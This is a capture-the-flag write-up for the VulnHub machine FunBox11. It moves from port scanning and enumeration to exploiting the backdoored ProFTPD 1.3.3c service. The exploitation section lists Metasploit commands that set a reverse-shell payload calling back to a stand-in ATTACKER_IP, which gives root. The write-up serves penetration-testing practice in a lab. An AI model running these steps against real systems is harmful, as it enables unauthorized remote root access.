# FunBox11 — VulnHub

**CTF:** VulnHub  
**Date:** 2025-11-12  
**Category:** pwn  
**Difficulty:** Grade 4  

---

## Summary

FunBox: Scriptkiddie (Funbox11) is an easy machine by 0815R2d2. Despite being easy, it requires knowing about the ProFTPD 1.3.3c backdoor. The machine hands root directly through the exploit — no privilege escalation needed.

---

## Setup

Added the machine to `/etc/hosts`:

```
192.168.1.x  funbox11
```

---

## Reconnaissance

```bash
nmap -sC -sV -p- funbox11
```

Open ports:

```
21/tcp   open  ftp      ProFTPD 1.3.3c
22/tcp   open  ssh      OpenSSH 7.2p2
25/tcp   open  smtp     Postfix
80/tcp   open  http     Apache 2.4.18 (WordPress 5.7.2)
110/tcp  open  pop3     Dovecot
139/tcp  open  netbios  Samba
143/tcp  open  imap     Dovecot
445/tcp  open  smb      Samba
```

A lot of services — but the FTP version immediately stood out: **ProFTPD 1.3.3c**.

---

## Enumeration

### SMB

```bash
smbclient -L funbox11
enum4linux funbox11
```

Enumerated a user: **bill**. Nothing exploitable via SMB.

### Web — WordPress

Browsed to port 80 — a WordPress 5.7.2 installation. Ran `wpscan`:

```bash
wpscan --url http://funbox11 -e u
```

No immediately exploitable plugin. Brute-force wasn't an option (the hint said not to).

### FTP — The Actual Path

Looked up **ProFTPD 1.3.3c**:

```bash
searchsploit ProFTPd 1.3.3c
```

Result:

```
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)
```

This version was distributed with a backdoor in the source code.

---

## Exploitation — ProFTPD 1.3.3c Backdoor

Launched Metasploit and used the backdoor module:

```bash
msfconsole
search proftpd_133c
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS funbox11
set payload cmd/unix/reverse
set LHOST ATTACKER_IP
run
```

Session opened — landed directly as **root**:

```
uid=0(root) gid=0(root) groups=0(root)
```

Read the root flag:

```bash
cat /root/root.txt
```

---

## Flags

- **Root flag** — `/root/root.txt` (direct root via backdoor, no privesc needed)
